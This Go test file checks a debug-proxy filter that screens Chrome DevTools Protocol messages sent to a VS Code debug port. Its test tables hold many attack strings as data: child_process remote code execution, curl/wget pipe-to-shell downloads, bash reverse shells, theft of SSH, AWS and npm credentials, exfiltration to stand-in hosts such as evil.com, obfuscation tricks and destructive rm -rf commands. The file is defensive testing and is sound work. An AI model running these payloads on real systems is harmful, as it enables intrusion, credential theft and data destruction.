package debugproxy

import (
	"encoding/json"
	"testing"
)

// =============================================================================
// DEBUG PORT ATTACK SIMULATION TESTS
// =============================================================================
// These tests simulate real-world attack payloads that could be sent through
// the VS Code debug interface to execute malicious code.
// =============================================================================

// TestAttack_CDP_RCE_ChildProcess tests various child_process RCE attempts
func TestAttack_CDP_RCE_ChildProcess(t *testing.T) {
	filter := NewFilter(FilterLevelFiltered)

	attacks := []struct {
		name       string
		expression string
		shouldBlock bool
	}{
		// Direct require
		{
			name:        "direct_require",
			expression:  `require('child_process').execSync('id')`,
			shouldBlock: true,
		},
		{
			name:        "node_prefix_require",
			expression:  `require('node:child_process').exec('whoami')`,
			shouldBlock: true,
		},
		// Dynamic require
		{
			name:        "dynamic_require",
			expression:  `require('child' + '_process').execSync('id')`,
			shouldBlock: true,
		},
		{
			name:        "require_from_variable",
			expression:  `const cp = 'child_process'; require(cp).exec('id')`,
			shouldBlock: true,
		},
		// Import
		{
			name:        "dynamic_import",
			expression:  `import('child_process').then(cp => cp.exec('id'))`,
			shouldBlock: true,
		},
		// Various exec methods
		{
			name:        "execSync",
			expression:  `execSync('rm -rf /')`,
			shouldBlock: true,
		},
		{
			name:        "exec",
			expression:  `exec('cat /etc/passwd', (e,o)=>console.log(o))`,
			shouldBlock: true,
		},
		{
			name:        "spawn",
			expression:  `spawn('sh', ['-c', 'curl evil.com | sh'])`,
			shouldBlock: true,
		},
		{
			name:        "spawnSync",
			expression:  `spawnSync('bash', ['-c', 'id'])`,
			shouldBlock: true,
		},
		{
			name:        "fork",
			expression:  `fork('./malicious.js')`,
			shouldBlock: true,
		},
		{
			name:        "execFile",
			expression:  `execFile('/bin/sh', ['-c', 'id'])`,
			shouldBlock: true,
		},
	}

	for _, attack := range attacks {
		t.Run(attack.name, func(t *testing.T) {
			params, _ := json.Marshal(EvaluateParams{Expression: attack.expression})
			msg := &CDPMessage{
				ID:     1,
				Method: "Runtime.evaluate",
				Params: params,
			}

			result := filter.FilterMessage(msg)

			if attack.shouldBlock && result.Allowed {
				t.Errorf("VULNERABILITY: Attack '%s' was NOT blocked\nPayload: %s", attack.name, attack.expression)
			} else if !attack.shouldBlock && !result.Allowed {
				t.Errorf("FALSE POSITIVE: Safe expression '%s' was blocked\nReason: %s", attack.name, result.Reason)
			} else if attack.shouldBlock {
				t.Logf("BLOCKED: %s (reason: %s)", attack.name, result.Reason)
			}
		})
	}
}

// TestAttack_CDP_RCE_ProcessBinding tests process.binding attacks
func TestAttack_CDP_RCE_ProcessBinding(t *testing.T) {
	filter := NewFilter(FilterLevelFiltered)

	attacks := []string{
		`process.binding('fs')`,
		`process.binding('spawn_sync')`,
		`process.binding('child_process')`,
		`process['binding']('fs')`,
		`process.dlopen('./malicious.node')`,
		`process._linkedBinding('fs')`,
		`process.mainModule.require('child_process')`,
	}

	for _, attack := range attacks {
		t.Run(attack, func(t *testing.T) {
			params, _ := json.Marshal(EvaluateParams{Expression: attack})
			msg := &CDPMessage{
				ID:     1,
				Method: "Runtime.evaluate",
				Params: params,
			}

			result := filter.FilterMessage(msg)

			if result.Allowed {
				t.Errorf("VULNERABILITY: process.binding attack not blocked: %s", attack)
			} else {
				t.Logf("BLOCKED: %s (reason: %s)", attack, result.Reason)
			}
		})
	}
}

// TestAttack_CDP_RCE_Eval tests eval-based RCE attempts
func TestAttack_CDP_RCE_Eval(t *testing.T) {
	filter := NewFilter(FilterLevelFiltered)

	attacks := []string{
		// Direct eval
		`eval("require('child_process').execSync('id')")`,
		`eval(atob('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdpZCcp'))`,

		// Function constructor
		`new Function("return require('child_process')")().execSync('id')`,
		`Function("return process")()`,
		`(function(){}).constructor("return this")()`,

		// Indirect eval
		`(0,eval)("require('child_process')")`,
		`window.eval("malicious")`,
		`global.eval("malicious")`,

		// setTimeout/setInterval with strings
		`setTimeout("require('child_process').exec('id')", 0)`,
		`setInterval("malicious_code", 1000)`,
	}

	for _, attack := range attacks {
		t.Run(attack[:min(50, len(attack))], func(t *testing.T) {
			params, _ := json.Marshal(EvaluateParams{Expression: attack})
			msg := &CDPMessage{
				ID:     1,
				Method: "Runtime.evaluate",
				Params: params,
			}

			result := filter.FilterMessage(msg)

			if result.Allowed {
				t.Errorf("VULNERABILITY: eval-based attack not blocked: %s", attack)
			} else {
				t.Logf("BLOCKED: %s... (reason: %s)", attack[:min(40, len(attack))], result.Reason)
			}
		})
	}
}

// TestAttack_CDP_FileSystem tests filesystem access attempts
func TestAttack_CDP_FileSystem(t *testing.T) {
	filter := NewFilter(FilterLevelFiltered)

	attacks := []string{
		// Read attacks
		`fs.readFileSync('/etc/passwd')`,
		`fs.readFile('/etc/shadow', 'utf8', console.log)`,
		`require('fs').readFileSync('/root/.ssh/id_rsa')`,

		// Write attacks
		`fs.writeFileSync('/etc/passwd', 'pwned')`,
		`fs.writeFile('/etc/crontab', '* * * * * curl evil.com', ()=>{})`,
		`fs.appendFileSync('/etc/bashrc', 'curl evil.com')`,

		// Delete attacks
		`fs.unlinkSync('/important/file')`,
		`fs.rmdirSync('/data', {recursive: true})`,
		`fs.rmSync('/', {recursive: true, force: true})`,

		// Directory attacks
		`fs.readdirSync('/etc')`,
		`fs.mkdirSync('/tmp/evil')`,

		// Symbolic link attacks
		`fs.symlinkSync('/etc/passwd', '/tmp/link')`,
		`fs.linkSync('/etc/shadow', '/tmp/shadow')`,

		// Permission attacks
		`fs.chmodSync('/bin/sh', '4755')`,
		`fs.chownSync('/tmp/evil', 0, 0)`,
	}

	for _, attack := range attacks {
		t.Run(attack[:min(50, len(attack))], func(t *testing.T) {
			params, _ := json.Marshal(EvaluateParams{Expression: attack})
			msg := &CDPMessage{
				ID:     1,
				Method: "Runtime.evaluate",
				Params: params,
			}

			result := filter.FilterMessage(msg)

			if result.Allowed {
				t.Errorf("VULNERABILITY: fs attack not blocked: %s", attack)
			} else {
				t.Logf("BLOCKED: %s... (reason: %s)", attack[:min(40, len(attack))], result.Reason)
			}
		})
	}
}

// TestAttack_CDP_NetworkExfiltration tests network-based data exfiltration
func TestAttack_CDP_NetworkExfiltration(t *testing.T) {
	filter := NewFilter(FilterLevelFiltered)

	attacks := []string{
		// HTTP modules
		`require('http').get('http://evil.com/'+secret)`,
		`require('https').request({host:'evil.com',path:'/'+data})`,
		`require('net').connect(1337, 'evil.com')`,

		// Fetch API
		`fetch('https://evil.com/steal?data='+secret)`,
		`fetch('https://evil.com', {method:'POST', body:JSON.stringify(secrets)})`,

		// XMLHttpRequest
		`new XMLHttpRequest().open('POST', 'https://evil.com')`,

		// WebSocket
		`new WebSocket('wss://evil.com/exfil')`,
		`new WebSocket('ws://evil.com').send(secret)`,

		// DNS exfiltration
		`require('dns').lookup(secret+'.evil.com')`,
	}

	for _, attack := range attacks {
		t.Run(attack[:min(50, len(attack))], func(t *testing.T) {
			params, _ := json.Marshal(EvaluateParams{Expression: attack})
			msg := &CDPMessage{
				ID:     1,
				Method: "Runtime.evaluate",
				Params: params,
			}

			result := filter.FilterMessage(msg)

			if result.Allowed {
				t.Errorf("VULNERABILITY: network exfil attack not blocked: %s", attack)
			} else {
				t.Logf("BLOCKED: %s... (reason: %s)", attack[:min(40, len(attack))], result.Reason)
			}
		})
	}
}

// TestAttack_CDP_Obfuscation tests various obfuscation techniques
func TestAttack_CDP_Obfuscation(t *testing.T) {
	filter := NewFilter(FilterLevelFiltered)

	attacks := []struct {
		name       string
		expression string
	}{
		// String concatenation
		{
			name:       "string_concat",
			expression: `require('child'+'_'+'process')`,
		},
		// Array join
		{
			name:       "array_join",
			expression: `require(['child','process'].join('_'))`,
		},
		// Hex encoding
		{
			name:       "hex_escape",
			expression: `\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73`,
		},
		// Unicode encoding
		{
			name:       "unicode_escape",
			expression: `\u0063\u0068\u0069\u006c\u0064\u005f\u0070\u0072\u006f\u0063\u0065\u0073\u0073`,
		},
		// Base64
		{
			name:       "base64_atob",
			expression: `atob('Y2hpbGRfcHJvY2Vzcw==')`,
		},
		{
			name:       "buffer_base64",
			expression: `Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString()`,
		},
		// String.fromCharCode
		{
			name:       "fromCharCode",
			expression: `String.fromCharCode(101,118,97,108)`,
		},
		// Template literals
		{
			name:       "template_literal",
			expression: "`${'child'}_${'process'}`",
		},
		// Object property access
		{
			name:       "bracket_notation",
			expression: `process['mainModule']['require']('child_process')`,
		},
		// Proxy/Reflect
		{
			name:       "reflect_apply",
			expression: `Reflect.apply(require, null, ['child_process'])`,
		},
		// with statement abuse
		{
			name:       "with_statement",
			expression: `with({r:require}){r('child_process')}`,
		},
	}

	for _, attack := range attacks {
		t.Run(attack.name, func(t *testing.T) {
			params, _ := json.Marshal(EvaluateParams{Expression: attack.expression})
			msg := &CDPMessage{
				ID:     1,
				Method: "Runtime.evaluate",
				Params: params,
			}

			result := filter.FilterMessage(msg)

			if result.Allowed {
				t.Errorf("VULNERABILITY: obfuscated attack not blocked: %s\nPayload: %s", attack.name, attack.expression)
			} else {
				t.Logf("BLOCKED: %s (reason: %s)", attack.name, result.Reason)
			}
		})
	}
}

// TestAttack_CDP_ShellInjection tests shell command injection attempts
func TestAttack_CDP_ShellInjection(t *testing.T) {
	filter := NewFilter(FilterLevelFiltered)

	attacks := []string{
		// Direct shell references
		`"/bin/sh -c 'id'"`,
		`"/bin/bash -i >& /dev/tcp/evil.com/1337 0>&1"`,
		`"bash -c 'curl evil.com | sh'"`,

		// Windows shells
		`"cmd.exe /c whoami"`,
		`"powershell -Command Get-Process"`,
		`"powershell.exe -EncodedCommand ..."`,

		// Shell special characters
		`"; rm -rf / #"`,
		`"| nc evil.com 1337"`,
		"'$(whoami)'",
		"'`id`'",

		// Common dangerous commands
		`"curl http://evil.com/shell.sh | sh"`,
		`"wget -O - http://evil.com/shell.sh | sh"`,
	}

	for _, attack := range attacks {
		t.Run(attack[:min(40, len(attack))], func(t *testing.T) {
			params, _ := json.Marshal(EvaluateParams{Expression: attack})
			msg := &CDPMessage{
				ID:     1,
				Method: "Runtime.evaluate",
				Params: params,
			}

			result := filter.FilterMessage(msg)

			if result.Allowed {
				t.Errorf("VULNERABILITY: shell injection not blocked: %s", attack)
			} else {
				t.Logf("BLOCKED: %s (reason: %s)", attack[:min(30, len(attack))], result.Reason)
			}
		})
	}
}

// TestAttack_CDP_CallFunctionOn tests attacks via callFunctionOn
func TestAttack_CDP_CallFunctionOn(t *testing.T) {
	filter := NewFilter(FilterLevelFiltered)

	attacks := []string{
		`function() { return require('child_process').execSync('id').toString(); }`,
		`function() { return eval("require('child_process')"); }`,
		`function() { return this.constructor.constructor("return process")(); }`,
		`function() { const cp = require('child_process'); return cp.exec('id'); }`,
		`async function() { return await import('child_process'); }`,
	}

	for _, attack := range attacks {
		t.Run(attack[:min(50, len(attack))], func(t *testing.T) {
			params, _ := json.Marshal(CallFunctionOnParams{FunctionDeclaration: attack})
			msg := &CDPMessage{
				ID:     1,
				Method: "Runtime.callFunctionOn",
				Params: params,
			}

			result := filter.FilterMessage(msg)

			if result.Allowed {
				t.Errorf("VULNERABILITY: callFunctionOn attack not blocked: %s", attack[:min(60, len(attack))])
			} else {
				t.Logf("BLOCKED: callFunctionOn (reason: %s)", result.Reason)
			}
		})
	}
}

// TestAttack_CDP_BlockedMethods tests that dangerous CDP methods are blocked
func TestAttack_CDP_BlockedMethods(t *testing.T) {
	filter := NewFilter(FilterLevelFiltered)

	// These methods should always be blocked
	blockedMethods := []string{
		"Runtime.compileScript",
		"Runtime.runScript",
		"Debugger.setScriptSource",
	}

	for _, method := range blockedMethods {
		t.Run(method, func(t *testing.T) {
			msg := &CDPMessage{
				ID:     1,
				Method: method,
			}

			result := filter.FilterMessage(msg)

			if result.Allowed {
				t.Errorf("VULNERABILITY: dangerous method %s not blocked", method)
			} else {
				t.Logf("BLOCKED: %s (reason: %s)", method, result.Reason)
			}
		})
	}
}

// TestAttack_CDP_StrictMode tests that strict mode blocks all evaluation
func TestAttack_CDP_StrictMode(t *testing.T) {
	filter := NewFilter(FilterLevelStrict)

	// Even safe expressions should be blocked in strict mode
	expressions := []string{
		"1 + 1",
		"Math.sqrt(4)",
		"JSON.stringify({})",
		"this.length",
	}

	for _, expr := range expressions {
		t.Run(expr, func(t *testing.T) {
			params, _ := json.Marshal(EvaluateParams{Expression: expr})
			msg := &CDPMessage{
				ID:     1,
				Method: "Runtime.evaluate",
				Params: params,
			}

			result := filter.FilterMessage(msg)

			if result.Allowed {
				t.Errorf("Strict mode should block all evaluation: %s", expr)
			} else {
				t.Logf("BLOCKED (strict): %s", expr)
			}
		})
	}
}

// TestAttack_CDP_SafeOperations ensures legitimate debugging still works
func TestAttack_CDP_SafeOperations(t *testing.T) {
	// These should be allowed for normal debugging
	safeExpressions := []struct {
		expr string
		desc string
	}{
		{"1 + 1", "arithmetic"},
		{"'hello'.toUpperCase()", "string methods"},
		{"[1,2,3].map(x => x*2)", "array operations"},
		{"JSON.stringify({a:1})", "JSON operations"},
		{"typeof x", "type checking"},
		{"x instanceof Array", "instanceof check"},
		{"Object.keys(obj)", "object inspection"},
		{"console.log('debug')", "console logging"},
		{"this.property", "property access"},
		{"arr.length", "length property"},
		{"Math.max(1, 2, 3)", "Math operations"},
		{"Date.now()", "date operations"},
		{"Promise.resolve(42)", "promise creation"},
	}

	for _, safe := range safeExpressions {
		t.Run(safe.desc, func(t *testing.T) {
			// Create fresh filter for each test to avoid rate limit interference
			filter := NewFilter(FilterLevelFiltered)

			params, _ := json.Marshal(EvaluateParams{Expression: safe.expr})
			msg := &CDPMessage{
				ID:     1,
				Method: "Runtime.evaluate",
				Params: params,
			}

			result := filter.FilterMessage(msg)

			if !result.Allowed {
				t.Errorf("FALSE POSITIVE: safe operation blocked: %s (%s)\nReason: %s", safe.expr, safe.desc, result.Reason)
			} else {
				t.Logf("ALLOWED: %s (%s)", safe.expr, safe.desc)
			}
		})
	}

	// Safe CDP methods should work
	safeMethods := []string{
		"Debugger.enable",
		"Debugger.disable",
		"Debugger.pause",
		"Debugger.resume",
		"Debugger.stepOver",
		"Debugger.stepInto",
		"Debugger.stepOut",
		"Debugger.setBreakpoint",
		"Debugger.setBreakpointByUrl",
		"Debugger.removeBreakpoint",
		"Debugger.getScriptSource",
		"Runtime.enable",
		"Runtime.disable",
		"Runtime.getProperties",
		"Runtime.releaseObject",
	}

	for _, method := range safeMethods {
		t.Run("method_"+method, func(t *testing.T) {
			filter := NewFilter(FilterLevelFiltered)
			msg := &CDPMessage{
				ID:     1,
				Method: method,
			}

			result := filter.FilterMessage(msg)

			if !result.Allowed {
				t.Errorf("FALSE POSITIVE: safe method blocked: %s\nReason: %s", method, result.Reason)
			}
		})
	}
}

// TestAttack_CDP_RealWorldExploits tests actual exploit payloads from the wild
func TestAttack_CDP_RealWorldExploits(t *testing.T) {
	filter := NewFilter(FilterLevelFiltered)

	// Real-world exploit payloads
	exploits := []struct {
		name    string
		payload string
		source  string
	}{
		{
			name:    "nodejs_rce_1",
			payload: `require('child_process').exec('curl https://attacker.com/shell.sh | sh')`,
			source:  "Common Node.js RCE",
		},
		{
			name:    "reverse_shell_bash",
			payload: `require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')`,
			source:  "Reverse shell",
		},
		{
			name:    "data_exfil",
			payload: `fetch('https://attacker.com/log?data='+btoa(JSON.stringify(process.env)))`,
			source:  "Environment exfiltration",
		},
		{
			name:    "ssh_key_theft",
			payload: `require('fs').readFileSync(require('os').homedir()+'/.ssh/id_rsa','utf8')`,
			source:  "SSH key theft",
		},
		{
			name:    "crypto_miner",
			payload: `require('child_process').exec('curl -s https://evil.com/miner.sh | bash')`,
			source:  "Crypto miner installation",
		},
		{
			name:    "aws_creds_theft",
			payload: `require('fs').readFileSync(process.env.HOME+'/.aws/credentials','utf8')`,
			source:  "AWS credentials theft",
		},
		{
			name:    "npm_token_theft",
			payload: `require('fs').readFileSync(process.env.HOME+'/.npmrc','utf8')`,
			source:  "NPM token theft",
		},
		{
			name:    "prototype_pollution_rce",
			payload: `({}).__proto__.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')`,
			source:  "Prototype pollution to RCE",
		},
	}

	for _, exploit := range exploits {
		t.Run(exploit.name, func(t *testing.T) {
			params, _ := json.Marshal(EvaluateParams{Expression: exploit.payload})
			msg := &CDPMessage{
				ID:     1,
				Method: "Runtime.evaluate",
				Params: params,
			}

			result := filter.FilterMessage(msg)

			if result.Allowed {
				t.Errorf("CRITICAL VULNERABILITY: Real-world exploit not blocked!\nName: %s\nSource: %s\nPayload: %s",
					exploit.name, exploit.source, exploit.payload)
			} else {
				t.Logf("BLOCKED: %s (%s) - reason: %s", exploit.name, exploit.source, result.Reason)
			}
		})
	}
}

// min is defined in filter.go
